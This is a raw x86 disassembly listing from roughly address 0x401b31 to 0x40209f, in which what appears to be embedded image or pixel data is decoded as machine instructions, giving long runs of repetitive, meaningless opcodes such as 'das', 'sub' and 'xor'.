  401b31:	3e 16                	ds push %ss
  401b33:	21 22                	and    %esp,(%edx)
  401b35:	0a 00                	or     (%eax),%al
	...
  401b47:	00 0a                	add    %cl,(%edx)
  401b49:	02 24 25 1d 14 1d 3b 	add    0x3b1d141d(,%eiz,1),%ah
  401b50:	3b 3b                	cmp    (%ebx),%edi
  401b52:	3b 3b                	cmp    (%ebx),%edi
  401b54:	3b 3b                	cmp    (%ebx),%edi
  401b56:	2f                   	das
  401b57:	3b 46 2f             	cmp    0x2f(%esi),%eax
  401b5a:	3b 46 2f             	cmp    0x2f(%esi),%eax
  401b5d:	2f                   	das
  401b5e:	3b 46 2f             	cmp    0x2f(%esi),%eax
  401b61:	46                   	inc    %esi
  401b62:	2f                   	das
  401b63:	3b 46 2f             	cmp    0x2f(%esi),%eax
  401b66:	46                   	inc    %esi
  401b67:	2f                   	das
  401b68:	3b 46 2f             	cmp    0x2f(%esi),%eax
  401b6b:	2f                   	das
  401b6c:	3b 2f                	cmp    (%edi),%ebp
  401b6e:	3b 3b                	cmp    (%ebx),%edi
  401b70:	3b 3b                	cmp    (%ebx),%edi
  401b72:	3b 45 25             	cmp    0x25(%ebp),%eax
  401b75:	24 02                	and    $0x2,%al
  401b77:	0a 00                	or     (%eax),%al
	...
  401b85:	00 00                	add    %al,(%eax)
  401b87:	05 07 1d 14 1d       	add    $0x1d141d07,%eax
  401b8c:	45                   	inc    %ebp
  401b8d:	1d 1d 45 1d 14       	sbb    $0x141d451d,%eax
  401b92:	14 14                	adc    $0x14,%al
  401b94:	14 14                	adc    $0x14,%al
  401b96:	14 3b                	adc    $0x3b,%al
  401b98:	14 3b                	adc    $0x3b,%al
  401b9a:	14 3b                	adc    $0x3b,%al
  401b9c:	3b 2f                	cmp    (%edi),%ebp
  401b9e:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401ba1:	14 2f                	adc    $0x2f,%al
  401ba3:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401ba6:	14 3b                	adc    $0x3b,%al
  401ba8:	14 14                	adc    $0x14,%al
  401baa:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401bad:	14 14                	adc    $0x14,%al
  401baf:	14 14                	adc    $0x14,%al
  401bb1:	1d 45 1d 1d 14       	sbb    $0x141d1d45,%eax
  401bb6:	1d 07 05 00 00       	sbb    $0x507,%eax
	...
  401bc3:	00 00                	add    %al,(%eax)
  401bc5:	00 05 08 1d 45 1d    	add    %al,0x1d451d08
  401bcb:	45                   	inc    %ebp
  401bcc:	1d 14 1d 14 14       	sbb    $0x14141d14,%eax
  401bd1:	14 3b                	adc    $0x3b,%al
  401bd3:	14 3b                	adc    $0x3b,%al
  401bd5:	3b 2f                	cmp    (%edi),%ebp
  401bd7:	14 3b                	adc    $0x3b,%al
  401bd9:	2f                   	das
  401bda:	2f                   	das
  401bdb:	2f                   	das
  401bdc:	2f                   	das
  401bdd:	2f                   	das
  401bde:	2f                   	das
  401bdf:	2f                   	das
  401be0:	2f                   	das
  401be1:	2f                   	das
  401be2:	2f                   	das
  401be3:	2f                   	das
  401be4:	2f                   	das
  401be5:	2f                   	das
  401be6:	2f                   	das
  401be7:	3f                   	aas
  401be8:	3f                   	aas
  401be9:	3f                   	aas
  401bea:	2f                   	das
  401beb:	2f                   	das
  401bec:	2f                   	das
  401bed:	46                   	inc    %esi
  401bee:	2f                   	das
  401bef:	3b 1d 14 14 14 45    	cmp    0x45141414,%ebx
  401bf5:	1d 45 3b 24 22       	sbb    $0x22243b45,%eax
	...
  401c02:	00 00                	add    %al,(%eax)
  401c04:	00 28                	add    %ch,(%eax)
  401c06:	07                   	pop    %es
  401c07:	3b 45 1d             	cmp    0x1d(%ebp),%eax
  401c0a:	45                   	inc    %ebp
  401c0b:	1d 1d 14 1d 14       	sbb    $0x141d141d,%eax
  401c10:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401c13:	14 3b                	adc    $0x3b,%al
  401c15:	2f                   	das
  401c16:	3b 2f                	cmp    (%edi),%ebp
  401c18:	2f                   	das
  401c19:	2f                   	das
  401c1a:	2f                   	das
  401c1b:	46                   	inc    %esi
  401c1c:	3f                   	aas
  401c1d:	3f                   	aas
  401c1e:	3f                   	aas
  401c1f:	3f                   	aas
  401c20:	3f                   	aas
  401c21:	3f                   	aas
  401c22:	3f                   	aas
  401c23:	3f                   	aas
  401c24:	3f                   	aas
  401c25:	3f                   	aas
  401c26:	3b 41 39             	cmp    0x39(%ecx),%eax
  401c29:	47                   	inc    %edi
  401c2a:	47                   	inc    %edi
  401c2b:	47                   	inc    %edi
  401c2c:	3a 1b                	cmp    (%ebx),%bl
  401c2e:	45                   	inc    %ebp
  401c2f:	2f                   	das
  401c30:	2f                   	das
  401c31:	3b 14 1d 14 1d 1d 45 	cmp    0x451d1d14(,%ebx,1),%edx
  401c38:	3b 07                	cmp    (%edi),%eax
  401c3a:	28 00                	sub    %al,(%eax)
	...
  401c44:	00 21                	add    %ah,(%ecx)
  401c46:	1d 1d 45 1d 1d       	sbb    $0x1d1d451d,%eax
  401c4b:	14 1d                	adc    $0x1d,%al
  401c4d:	14 14                	adc    $0x14,%al
  401c4f:	14 14                	adc    $0x14,%al
  401c51:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401c54:	2f                   	das
  401c55:	2f                   	das
  401c56:	2f                   	das
  401c57:	2f                   	das
  401c58:	3f                   	aas
  401c59:	3f                   	aas
  401c5a:	2f                   	das
  401c5b:	14 45                	adc    $0x45,%al
  401c5d:	41                   	inc    %ecx
  401c5e:	1b 42 38             	sbb    0x38(%edx),%eax
  401c61:	42                   	inc    %edx
  401c62:	41                   	inc    %ecx
  401c63:	35 35 47 23 06       	xor    $0x6234735,%eax
  401c68:	23 06                	and    (%esi),%eax
  401c6a:	23 23                	and    (%ebx),%esp
  401c6c:	06                   	push   %es
  401c6d:	06                   	push   %es
  401c6e:	23 23                	and    (%ebx),%esp
  401c70:	41                   	inc    %ecx
  401c71:	2f                   	das
  401c72:	2f                   	das
  401c73:	14 3b                	adc    $0x3b,%al
  401c75:	14 45                	adc    $0x45,%al
  401c77:	1d 45 1d 21 00       	sbb    $0x211d45,%eax
	...
  401c84:	28 0c 1d 45 1d 45 14 	sub    %cl,0x14451d45(,%ebx,1)
  401c8b:	1d 14 14 3b 3b       	sbb    $0x3b3b1414,%eax
  401c90:	3b 2f                	cmp    (%edi),%ebp
  401c92:	2f                   	das
  401c93:	2f                   	das
  401c94:	2f                   	das
  401c95:	2f                   	das
  401c96:	3f                   	aas
  401c97:	46                   	inc    %esi
  401c98:	45                   	inc    %ebp
  401c99:	42                   	inc    %edx
  401c9a:	15 23 23 23 23       	adc    $0x23232323,%eax
  401c9f:	23 23                	and    (%ebx),%esp
  401ca1:	23 23                	and    (%ebx),%esp
  401ca3:	23 23                	and    (%ebx),%esp
  401ca5:	23 23                	and    (%ebx),%esp
  401ca7:	23 23                	and    (%ebx),%esp
  401ca9:	23 23                	and    (%ebx),%esp
  401cab:	23 23                	and    (%ebx),%esp
  401cad:	23 23                	and    (%ebx),%esp
  401caf:	23 06                	and    (%esi),%eax
  401cb1:	23 35 46 14 14 1d    	and    0x1d141446,%esi
  401cb7:	14 1d                	adc    $0x1d,%al
  401cb9:	14 24                	adc    $0x24,%al
  401cbb:	28 00                	sub    %al,(%eax)
  401cbd:	00 00                	add    %al,(%eax)
  401cbf:	00 00                	add    %al,(%eax)
  401cc1:	00 00                	add    %al,(%eax)
  401cc3:	00 2e                	add    %ch,(%esi)
  401cc5:	25 1d 45 1d 14       	and    $0x141d451d,%eax
  401cca:	1d 14 14 14 14       	sbb    $0x14141414,%eax
  401ccf:	3b 14 2f             	cmp    (%edi,%ebp,1),%edx
  401cd2:	3b 2f                	cmp    (%edi),%ebp
  401cd4:	3f                   	aas
  401cd5:	2f                   	das
  401cd6:	41                   	inc    %ecx
  401cd7:	15 23 23 23 23       	adc    $0x23232323,%eax
  401cdc:	30 23                	xor    %ah,(%ebx)
  401cde:	30 23                	xor    %ah,(%ebx)
  401ce0:	30 23                	xor    %ah,(%ebx)
  401ce2:	30 23                	xor    %ah,(%ebx)
  401ce4:	30 23                	xor    %ah,(%ebx)
  401ce6:	30 23                	xor    %ah,(%ebx)
  401ce8:	23 23                	and    (%ebx),%esp
  401cea:	23 23                	and    (%ebx),%esp
  401cec:	23 23                	and    (%ebx),%esp
  401cee:	23 23                	and    (%ebx),%esp
  401cf0:	23 23                	and    (%ebx),%esp
  401cf2:	06                   	push   %es
  401cf3:	41                   	inc    %ecx
  401cf4:	2f                   	das
  401cf5:	3b 14 14             	cmp    (%esp,%edx,1),%edx
  401cf8:	1d 1d 25 2e 00       	sbb    $0x2e251d,%eax
  401cfd:	00 00                	add    %al,(%eax)
  401cff:	00 00                	add    %al,(%eax)
  401d01:	00 00                	add    %al,(%eax)
  401d03:	00 27                	add    %ah,(%edi)
  401d05:	1d 1d 1d 14 1d       	sbb    $0x1d141d1d,%eax
  401d0a:	14 14                	adc    $0x14,%al
  401d0c:	3b 3b                	cmp    (%ebx),%edi
  401d0e:	3b 2f                	cmp    (%edi),%ebp
  401d10:	2f                   	das
  401d11:	2f                   	das
  401d12:	3f                   	aas
  401d13:	3f                   	aas
  401d14:	35 15 23 23 30       	xor    $0x30232315,%eax
  401d19:	30 30                	xor    %dh,(%eax)
  401d1b:	30 30                	xor    %dh,(%eax)
  401d1d:	30 30                	xor    %dh,(%eax)
  401d1f:	30 30                	xor    %dh,(%eax)
  401d21:	30 30                	xor    %dh,(%eax)
  401d23:	30 30                	xor    %dh,(%eax)
  401d25:	30 30                	xor    %dh,(%eax)
  401d27:	30 23                	xor    %ah,(%ebx)
  401d29:	23 23                	and    (%ebx),%esp
  401d2b:	23 23                	and    (%ebx),%esp
  401d2d:	23 23                	and    (%ebx),%esp
  401d2f:	06                   	push   %es
  401d30:	23 23                	and    (%ebx),%esp
  401d32:	23 06                	and    (%esi),%eax
  401d34:	41                   	inc    %ecx
  401d35:	2f                   	das
  401d36:	1d 14 1d 14 1d       	sbb    $0x1d141d14,%eax
  401d3b:	16                   	push   %ss
	...
  401d44:	19 3b                	sbb    %edi,(%ebx)
  401d46:	45                   	inc    %ebp
  401d47:	14 1d                	adc    $0x1d,%al
  401d49:	14 14                	adc    $0x14,%al
  401d4b:	3b 14 2f             	cmp    (%edi,%ebp,1),%edx
  401d4e:	3b 2f                	cmp    (%edi),%ebp
  401d50:	2f                   	das
  401d51:	3f                   	aas
  401d52:	14 47                	adc    $0x47,%al
  401d54:	23 23                	and    (%ebx),%esp
  401d56:	30 30                	xor    %dh,(%eax)
  401d58:	30 15 30 30 3c 30    	xor    %dl,0x303c3030
  401d5e:	47                   	inc    %edi
  401d5f:	3c 47                	cmp    $0x47,%al
  401d61:	3c 3c                	cmp    $0x3c,%al
  401d63:	30 3c 30             	xor    %bh,(%eax,%esi,1)
  401d66:	15 30 30 30 30       	adc    $0x30303030,%eax
  401d6b:	23 23                	and    (%ebx),%esp
  401d6d:	23 23                	and    (%ebx),%esp
  401d6f:	23 23                	and    (%ebx),%esp
  401d71:	23 23                	and    (%ebx),%esp
  401d73:	23 06                	and    (%esi),%eax
  401d75:	35 2f 14 14 1d       	xor    $0x1d14142f,%eax
  401d7a:	3b 19                	cmp    (%ecx),%ebx
	...
  401d84:	19 1d 1d 14 1d 14    	sbb    %ebx,0x141d141d
  401d8a:	14 3b                	adc    $0x3b,%al
  401d8c:	14 2f                	adc    $0x2f,%al
  401d8e:	2f                   	das
  401d8f:	2f                   	das
  401d90:	3f                   	aas
  401d91:	1d 23 23 30 23       	sbb    $0x23302323,%eax
  401d96:	30 30                	xor    %dh,(%eax)
  401d98:	30 30                	xor    %dh,(%eax)
  401d9a:	47                   	inc    %edi
  401d9b:	47                   	inc    %edi
  401d9c:	47                   	inc    %edi
  401d9d:	30 30                	xor    %dh,(%eax)
  401d9f:	30 30                	xor    %dh,(%eax)
  401da1:	30 30                	xor    %dh,(%eax)
  401da3:	47                   	inc    %edi
  401da4:	3c 30                	cmp    $0x30,%al
  401da6:	3c 30                	cmp    $0x30,%al
  401da8:	3c 30                	cmp    $0x30,%al
  401daa:	15 23 15 23 23       	adc    $0x23231523,%eax
  401daf:	23 23                	and    (%ebx),%esp
  401db1:	23 06                	and    (%esi),%eax
  401db3:	23 06                	and    (%esi),%eax
  401db5:	23 2f                	and    (%edi),%ebp
  401db7:	14 14                	adc    $0x14,%al
  401db9:	1d 14 19 00 00       	sbb    $0x1914,%eax
  401dbe:	00 00                	add    %al,(%eax)
  401dc0:	00 00                	add    %al,(%eax)
  401dc2:	00 00                	add    %al,(%eax)
  401dc4:	19 3b                	sbb    %edi,(%ebx)
  401dc6:	45                   	inc    %ebp
  401dc7:	1d 14 14 3b 3b       	sbb    $0x3b3b1414,%eax
  401dcc:	2f                   	das
  401dcd:	3b 2f                	cmp    (%edi),%ebp
  401dcf:	3f                   	aas
  401dd0:	35 23 23 30 30       	xor    $0x30302323,%eax
  401dd5:	30 30                	xor    %dh,(%eax)
  401dd7:	30 47 30             	xor    %al,0x30(%edi)
  401dda:	30 30                	xor    %dh,(%eax)
  401ddc:	30 3a                	xor    %bh,(%edx)
  401dde:	3a 38                	cmp    (%eax),%bh
  401de0:	38 38                	cmp    %bh,(%eax)
  401de2:	3a 30                	cmp    (%eax),%dh
  401de4:	30 30                	xor    %dh,(%eax)
  401de6:	30 3c 30             	xor    %bh,(%eax,%esi,1)
  401de9:	30 30                	xor    %dh,(%eax)
  401deb:	30 30                	xor    %dh,(%eax)
  401ded:	23 23                	and    (%ebx),%esp
  401def:	23 23                	and    (%ebx),%esp
  401df1:	23 23                	and    (%ebx),%esp
  401df3:	23 23                	and    (%ebx),%esp
  401df5:	06                   	push   %es
  401df6:	1b 46 14             	sbb    0x14(%esi),%eax
  401df9:	1d 46 19 00 00       	sbb    $0x1946,%eax
  401dfe:	00 00                	add    %al,(%eax)
  401e00:	00 00                	add    %al,(%eax)
  401e02:	00 00                	add    %al,(%eax)
  401e04:	19 3b                	sbb    %edi,(%ebx)
  401e06:	14 14                	adc    $0x14,%al
  401e08:	14 3b                	adc    $0x3b,%al
  401e0a:	14 2f                	adc    $0x2f,%al
  401e0c:	3b 2f                	cmp    (%edi),%ebp
  401e0e:	3f                   	aas
  401e0f:	45                   	inc    %ebp
  401e10:	06                   	push   %es
  401e11:	30 15 30 30 3c 47    	xor    %dl,0x473c3030
  401e17:	30 30                	xor    %dh,(%eax)
  401e19:	3a 45 2f             	cmp    0x2f(%ebp),%al
  401e1c:	2c 2c                	sub    $0x2c,%al
  401e1e:	2b 2b                	sub    (%ebx),%ebp
  401e20:	2b 2b                	sub    (%ebx),%ebp
  401e22:	2b 2c 3f             	sub    (%edi,%edi,1),%ebp
  401e25:	45                   	inc    %ebp
  401e26:	1b 30                	sbb    (%eax),%esi
  401e28:	30 30                	xor    %dh,(%eax)
  401e2a:	3c 30                	cmp    $0x30,%al
  401e2c:	30 30                	xor    %dh,(%eax)
  401e2e:	15 23 23 23 23       	adc    $0x23232323,%eax
  401e33:	23 23                	and    (%ebx),%esp
  401e35:	23 23                	and    (%ebx),%esp
  401e37:	14 14                	adc    $0x14,%al
  401e39:	14 3b                	adc    $0x3b,%al
  401e3b:	19 00                	sbb    %eax,(%eax)
  401e3d:	00 00                	add    %al,(%eax)
  401e3f:	00 00                	add    %al,(%eax)
  401e41:	00 00                	add    %al,(%eax)
  401e43:	00 19                	add    %bl,(%ecx)
  401e45:	3b 1d 14 3b 14 3b    	cmp    0x3b143b14,%ebx
  401e4b:	2f                   	das
  401e4c:	2f                   	das
  401e4d:	3f                   	aas
  401e4e:	45                   	inc    %ebp
  401e4f:	23 23                	and    (%ebx),%esp
  401e51:	15 30 30 30 3c       	adc    $0x3c303030,%eax
  401e56:	30 38                	xor    %bh,(%eax)
  401e58:	2f                   	das
  401e59:	2b 2b                	sub    (%ebx),%ebp
  401e5b:	2b 2b                	sub    (%ebx),%ebp
  401e5d:	2b 2b                	sub    (%ebx),%ebp
  401e5f:	2b 2b                	sub    (%ebx),%ebp
  401e61:	2b 2b                	sub    (%ebx),%ebp
  401e63:	2b 2b                	sub    (%ebx),%ebp
  401e65:	2b 2b                	sub    (%ebx),%ebp
  401e67:	49                   	dec    %ecx
  401e68:	41                   	inc    %ecx
  401e69:	3c 30                	cmp    $0x30,%al
  401e6b:	30 30                	xor    %dh,(%eax)
  401e6d:	3c 23                	cmp    $0x23,%al
  401e6f:	15 23 23 23 06       	adc    $0x6232323,%eax
  401e74:	23 23                	and    (%ebx),%esp
  401e76:	06                   	push   %es
  401e77:	35 2f 1d 46 19       	xor    $0x19461d2f,%eax
	...
  401e84:	19 3b                	sbb    %edi,(%ebx)
  401e86:	14 3b                	adc    $0x3b,%al
  401e88:	14 3b                	adc    $0x3b,%al
  401e8a:	2f                   	das
  401e8b:	3b 3f                	cmp    (%edi),%edi
  401e8d:	14 23                	adc    $0x23,%al
  401e8f:	23 30                	and    (%eax),%esi
  401e91:	30 30                	xor    %dh,(%eax)
  401e93:	3c 47                	cmp    $0x47,%al
  401e95:	30 45 2b             	xor    %al,0x2b(%ebp)
  401e98:	2b 2b                	sub    (%ebx),%ebp
  401e9a:	2b 2b                	sub    (%ebx),%ebp
  401e9c:	2b 2b                	sub    (%ebx),%ebp
  401e9e:	2b 2b                	sub    (%ebx),%ebp
  401ea0:	2b 2b                	sub    (%ebx),%ebp
  401ea2:	2b 2b                	sub    (%ebx),%ebp
  401ea4:	2b 2b                	sub    (%ebx),%ebp
  401ea6:	2b 2b                	sub    (%ebx),%ebp
  401ea8:	2b 3f                	sub    (%edi),%edi
  401eaa:	3a 3c 30             	cmp    (%eax,%esi,1),%bh
  401ead:	30 30                	xor    %dh,(%eax)
  401eaf:	30 23                	xor    %ah,(%ebx)
  401eb1:	23 23                	and    (%ebx),%esp
  401eb3:	23 23                	and    (%ebx),%esp
  401eb5:	23 06                	and    (%esi),%eax
  401eb7:	38 2f                	cmp    %ch,(%edi)
  401eb9:	14 3b                	adc    $0x3b,%al
  401ebb:	19 00                	sbb    %eax,(%eax)
  401ebd:	00 00                	add    %al,(%eax)
  401ebf:	00 00                	add    %al,(%eax)
  401ec1:	00 00                	add    %al,(%eax)
  401ec3:	00 19                	add    %bl,(%ecx)
  401ec5:	3b 14 14             	cmp    (%esp,%edx,1),%edx
  401ec8:	3b 3b                	cmp    (%ebx),%edi
  401eca:	2f                   	das
  401ecb:	2f                   	das
  401ecc:	3f                   	aas
  401ecd:	3a 23                	cmp    (%ebx),%ah
  401ecf:	30 30                	xor    %dh,(%eax)
  401ed1:	30 30                	xor    %dh,(%eax)
  401ed3:	47                   	inc    %edi
  401ed4:	30 2f                	xor    %ch,(%edi)
  401ed6:	2b 2b                	sub    (%ebx),%ebp
  401ed8:	2b 2b                	sub    (%ebx),%ebp
  401eda:	2b 2b                	sub    (%ebx),%ebp
  401edc:	2b 2b                	sub    (%ebx),%ebp
  401ede:	2b 2b                	sub    (%ebx),%ebp
  401ee0:	2b 2b                	sub    (%ebx),%ebp
  401ee2:	2b 2b                	sub    (%ebx),%ebp
  401ee4:	2b 2b                	sub    (%ebx),%ebp
  401ee6:	2b 2b                	sub    (%ebx),%ebp
  401ee8:	2b 2b                	sub    (%ebx),%ebp
  401eea:	2c 3a                	sub    $0x3a,%al
  401eec:	30 30                	xor    %dh,(%eax)
  401eee:	3c 30                	cmp    $0x30,%al
  401ef0:	30 15 23 23 23 23    	xor    %dl,0x23232323
  401ef6:	23 3a                	and    (%edx),%edi
  401ef8:	2f                   	das
  401ef9:	14 46                	adc    $0x46,%al
  401efb:	19 00                	sbb    %eax,(%eax)
  401efd:	00 00                	add    %al,(%eax)
  401eff:	00 00                	add    %al,(%eax)
  401f01:	00 00                	add    %al,(%eax)
  401f03:	00 19                	add    %bl,(%ecx)
  401f05:	46                   	inc    %esi
  401f06:	1d 3b 2f 2f 3b       	sbb    $0x3b2f2f3b,%eax
  401f0b:	3f                   	aas
  401f0c:	45                   	inc    %ebp
  401f0d:	06                   	push   %es
  401f0e:	30 30                	xor    %dh,(%eax)
  401f10:	30 3c 47             	xor    %bh,(%edi,%eax,2)
  401f13:	30 45 2b             	xor    %al,0x2b(%ebp)
  401f16:	2b 2b                	sub    (%ebx),%ebp
  401f18:	2b 2b                	sub    (%ebx),%ebp
  401f1a:	2b 2b                	sub    (%ebx),%ebp
  401f1c:	2b 2b                	sub    (%ebx),%ebp
  401f1e:	2b 2b                	sub    (%ebx),%ebp
  401f20:	2b 2b                	sub    (%ebx),%ebp
  401f22:	2b 2b                	sub    (%ebx),%ebp
  401f24:	2b 2b                	sub    (%ebx),%ebp
  401f26:	2b 2b                	sub    (%ebx),%ebp
  401f28:	2b 2b                	sub    (%ebx),%ebp
  401f2a:	2b 2c 3a             	sub    (%edx,%edi,1),%ebp
  401f2d:	30 3c 30             	xor    %bh,(%eax,%esi,1)
  401f30:	30 23                	xor    %ah,(%ebx)
  401f32:	15 23 23 23 06       	adc    $0x6232323,%eax
  401f37:	3c 2f                	cmp    $0x2f,%al
  401f39:	14 46                	adc    $0x46,%al
  401f3b:	19 00                	sbb    %eax,(%eax)
  401f3d:	00 00                	add    %al,(%eax)
  401f3f:	00 00                	add    %al,(%eax)
  401f41:	00 00                	add    %al,(%eax)
  401f43:	00 19                	add    %bl,(%ecx)
  401f45:	3b 14 3b             	cmp    (%ebx,%edi,1),%edx
  401f48:	14 2f                	adc    $0x2f,%al
  401f4a:	2f                   	das
  401f4b:	2f                   	das
  401f4c:	15 23 30 30 30       	adc    $0x30303023,%eax
  401f51:	47                   	inc    %edi
  401f52:	30 1b                	xor    %bl,(%ebx)
  401f54:	2b 2b                	sub    (%ebx),%ebp
  401f56:	2b 2b                	sub    (%ebx),%ebp
  401f58:	2b 2b                	sub    (%ebx),%ebp
  401f5a:	2b 2b                	sub    (%ebx),%ebp
  401f5c:	49                   	dec    %ecx
  401f5d:	1d 41 35 41 41       	sbb    $0x41413541,%eax
  401f62:	1d 49 2b 2b 2b       	sbb    $0x2b2b2b49,%eax
  401f67:	2b 2b                	sub    (%ebx),%ebp
  401f69:	2b 2b                	sub    (%ebx),%ebp
  401f6b:	2b 14 30             	sub    (%eax,%esi,1),%edx
  401f6e:	47                   	inc    %edi
  401f6f:	30 30                	xor    %dh,(%eax)
  401f71:	3c 23                	cmp    $0x23,%al
  401f73:	23 23                	and    (%ebx),%esp
  401f75:	23 23                	and    (%ebx),%esp
  401f77:	30 2f                	xor    %ch,(%edi)
  401f79:	14 46                	adc    $0x46,%al
  401f7b:	19 00                	sbb    %eax,(%eax)
  401f7d:	00 00                	add    %al,(%eax)
  401f7f:	00 00                	add    %al,(%eax)
  401f81:	00 00                	add    %al,(%eax)
  401f83:	00 19                	add    %bl,(%ecx)
  401f85:	46                   	inc    %esi
  401f86:	14 3b                	adc    $0x3b,%al
  401f88:	2f                   	das
  401f89:	2f                   	das
  401f8a:	3f                   	aas
  401f8b:	35 23 23 30 30       	xor    $0x30302323,%eax
  401f90:	47                   	inc    %edi
  401f91:	3a 30                	cmp    (%eax),%dh
  401f93:	3f                   	aas
  401f94:	2b 2b                	sub    (%ebx),%ebp
  401f96:	2b 2b                	sub    (%ebx),%ebp
  401f98:	2b 2b                	sub    (%ebx),%ebp
  401f9a:	2b 14 39             	sub    (%ecx,%edi,1),%edx
  401f9d:	39 42 39             	cmp    %eax,0x39(%edx)
  401fa0:	39 42 39             	cmp    %eax,0x39(%edx)
  401fa3:	39 41 2c             	cmp    %eax,0x2c(%ecx)
  401fa6:	2b 2b                	sub    (%ebx),%ebp
  401fa8:	2b 2b                	sub    (%ebx),%ebp
  401faa:	2b 2b                	sub    (%ebx),%ebp
  401fac:	2b 38                	sub    (%eax),%edi
  401fae:	30 3c 30             	xor    %bh,(%eax,%esi,1)
  401fb1:	30 30                	xor    %dh,(%eax)
  401fb3:	23 23                	and    (%ebx),%esp
  401fb5:	23 06                	and    (%esi),%eax
  401fb7:	3c 2f                	cmp    $0x2f,%al
  401fb9:	3b 3b                	cmp    (%ebx),%edi
  401fbb:	19 00                	sbb    %eax,(%eax)
  401fbd:	00 00                	add    %al,(%eax)
  401fbf:	00 00                	add    %al,(%eax)
  401fc1:	00 00                	add    %al,(%eax)
  401fc3:	00 19                	add    %bl,(%ecx)
  401fc5:	46                   	inc    %esi
  401fc6:	14 2f                	adc    $0x2f,%al
  401fc8:	3b 2f                	cmp    (%edi),%ebp
  401fca:	3f                   	aas
  401fcb:	30 23                	xor    %ah,(%ebx)
  401fcd:	30 30                	xor    %dh,(%eax)
  401fcf:	3c 47                	cmp    $0x47,%al
  401fd1:	30 42 2b             	xor    %al,0x2b(%edx)
  401fd4:	2b 2b                	sub    (%ebx),%ebp
  401fd6:	2b 2b                	sub    (%ebx),%ebp
  401fd8:	2b 2b                	sub    (%ebx),%ebp
  401fda:	14 39                	adc    $0x39,%al
  401fdc:	1b 42 42             	sbb    0x42(%edx),%eax
  401fdf:	42                   	inc    %edx
  401fe0:	42                   	inc    %edx
  401fe1:	42                   	inc    %edx
  401fe2:	1b 42 39             	sbb    0x39(%edx),%eax
  401fe5:	41                   	inc    %ecx
  401fe6:	2b 2b                	sub    (%ebx),%ebp
  401fe8:	2b 2b                	sub    (%ebx),%ebp
  401fea:	2b 2b                	sub    (%ebx),%ebp
  401fec:	2b 45 30             	sub    0x30(%ebp),%eax
  401fef:	47                   	inc    %edi
  401ff0:	3c 30                	cmp    $0x30,%al
  401ff2:	30 15 23 23 23 39    	xor    %dl,0x39232323
  401ff8:	3f                   	aas
  401ff9:	14 46                	adc    $0x46,%al
  401ffb:	32 00                	xor    (%eax),%al
  401ffd:	00 00                	add    %al,(%eax)
  401fff:	00 00                	add    %al,(%eax)
  402001:	00 00                	add    %al,(%eax)
  402003:	00 19                	add    %bl,(%ecx)
  402005:	46                   	inc    %esi
  402006:	1d 2f 2f 3f 45       	sbb    $0x453f2f2f,%eax
  40200b:	23 30                	and    (%eax),%esi
  40200d:	30 30                	xor    %dh,(%eax)
  40200f:	47                   	inc    %edi
  402010:	3a 30                	cmp    (%eax),%dh
  402012:	35 2b 2b 2b 2b       	xor    $0x2b2b2b2b,%eax
  402017:	2b 2b                	sub    (%ebx),%ebp
  402019:	2c 42                	sub    $0x42,%al
  40201b:	42                   	inc    %edx
  40201c:	42                   	inc    %edx
  40201d:	42                   	inc    %edx
  40201e:	42                   	inc    %edx
  40201f:	41                   	inc    %ecx
  402020:	42                   	inc    %edx
  402021:	42                   	inc    %edx
  402022:	42                   	inc    %edx
  402023:	42                   	inc    %edx
  402024:	42                   	inc    %edx
  402025:	39 3f                	cmp    %edi,(%edi)
  402027:	2b 2b                	sub    (%ebx),%ebp
  402029:	2b 2b                	sub    (%ebx),%ebp
  40202b:	2b 2b                	sub    (%ebx),%ebp
  40202d:	2f                   	das
  40202e:	30 39                	xor    %bh,(%ecx)
  402030:	30 30                	xor    %dh,(%eax)
  402032:	3c 23                	cmp    $0x23,%al
  402034:	23 23                	and    (%ebx),%esp
  402036:	06                   	push   %es
  402037:	41                   	inc    %ecx
  402038:	3f                   	aas
  402039:	14 46                	adc    $0x46,%al
  40203b:	19 00                	sbb    %eax,(%eax)
  40203d:	00 00                	add    %al,(%eax)
  40203f:	00 00                	add    %al,(%eax)
  402041:	00 00                	add    %al,(%eax)
  402043:	00 19                	add    %bl,(%ecx)
  402045:	46                   	inc    %esi
  402046:	14 3b                	adc    $0x3b,%al
  402048:	2f                   	das
  402049:	3f                   	aas
  40204a:	38 23                	cmp    %ah,(%ebx)
  40204c:	30 30                	xor    %dh,(%eax)
  40204e:	30 47 39             	xor    %al,0x39(%edi)
  402051:	30 45 2b             	xor    %al,0x2b(%ebp)
  402054:	2b 2b                	sub    (%ebx),%ebp
  402056:	2b 2b                	sub    (%ebx),%ebp
  402058:	2b 45 39             	sub    0x39(%ebp),%eax
  40205b:	42                   	inc    %edx
  40205c:	42                   	inc    %edx
  40205d:	42                   	inc    %edx
  40205e:	41                   	inc    %ecx
  40205f:	42                   	inc    %edx
  402060:	42                   	inc    %edx
  402061:	41                   	inc    %ecx
  402062:	42                   	inc    %edx
  402063:	42                   	inc    %edx
  402064:	42                   	inc    %edx
  402065:	39 3f                	cmp    %edi,(%edi)
  402067:	2b 2b                	sub    (%ebx),%ebp
  402069:	2b 2b                	sub    (%ebx),%ebp
  40206b:	2b 2b                	sub    (%ebx),%ebp
  40206d:	3f                   	aas
  40206e:	30 47 3a             	xor    %al,0x3a(%edi)
  402071:	30 30                	xor    %dh,(%eax)
  402073:	30 30                	xor    %dh,(%eax)
  402075:	23 23                	and    (%ebx),%esp
  402077:	14 2f                	adc    $0x2f,%al
  402079:	14 46                	adc    $0x46,%al
  40207b:	19 00                	sbb    %eax,(%eax)
  40207d:	00 00                	add    %al,(%eax)
  40207f:	00 00                	add    %al,(%eax)
  402081:	00 00                	add    %al,(%eax)
  402083:	00 19                	add    %bl,(%ecx)
  402085:	46                   	inc    %esi
  402086:	14 2f                	adc    $0x2f,%al
  402088:	2f                   	das
  402089:	2f                   	das
  40208a:	47                   	inc    %edi
  40208b:	23 30                	and    (%eax),%esi
  40208d:	3c 30                	cmp    $0x30,%al
  40208f:	3a 3a                	cmp    (%edx),%bh
  402091:	3a 39                	cmp    (%ecx),%bh
  402093:	2b 2b                	sub    (%ebx),%ebp
  402095:	2b 2b                	sub    (%ebx),%ebp
  402097:	2b 2c 42             	sub    (%edx,%eax,2),%ebp
  40209a:	42                   	inc    %edx
  40209b:	42                   	inc    %edx
  40209c:	42                   	inc    %edx
  40209d:	41                   	inc    %ecx
  40209e:	42                   	inc    %edx
  40209f:	42                   	inc    %edx
